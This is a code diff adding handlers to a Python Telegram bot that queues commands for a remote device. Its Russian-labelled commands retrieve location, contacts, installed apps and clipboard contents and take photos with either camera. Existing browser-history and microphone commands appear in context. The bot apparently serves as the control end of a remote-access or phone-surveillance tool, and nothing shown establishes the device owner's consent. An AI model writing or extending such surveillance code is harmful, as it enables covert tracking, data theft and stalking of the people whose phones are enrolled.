@@ -937,6 +937,52 @@ async def process_update(update: dict):
         if err: await send_tg(chat_id, err)
         else: await enqueue_multi(chat_id, {"cmd": "browser_history", "days": days}, f"история браузеров ({days} дн.)")
 
+    elif text == "/location":
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "get_location"}, "геолокация")
+
+    elif text == "/contacts":
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "get_contacts"}, "контакты")
+
+    elif text == "/apps":
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "get_apps"}, "список приложений")
+
+    elif text == "/clipboard":
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "get_clipboard"}, "буфер обмена")
+
+    elif text.startswith("/brightness "):
+        parts = text.split()
+        if len(parts) != 2 or not parts[1].isdigit() or not (0 <= int(parts[1]) <= 100):
+            await send_tg(chat_id, "⚠️ /brightness 0-100")
+        else:
+            dev_id, err = require_device(chat_id)
+            if err: await send_tg(chat_id, err)
+            else: await enqueue_multi(chat_id, {"cmd": "set_brightness", "level": int(parts[1])}, f"яркость {parts[1]}%")
+
+    elif text == "/vibrate":
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "vibrate", "ms": 1000}, "вибрация")
+
+    elif text in ("/flashon", "/flashoff"):
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "flashlight", "on": text == "/flashon"}, "фонарик")
+
+    elif text in ("/photo", "/photof"):
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else:
+            cam = "front" if text == "/photof" else "back"
+            await enqueue_multi(chat_id, {"cmd": "take_photo", "camera": cam}, f"фото ({cam})")
+
     elif text == "/micro":
         dev_id, err = require_device(chat_id)
         if err:
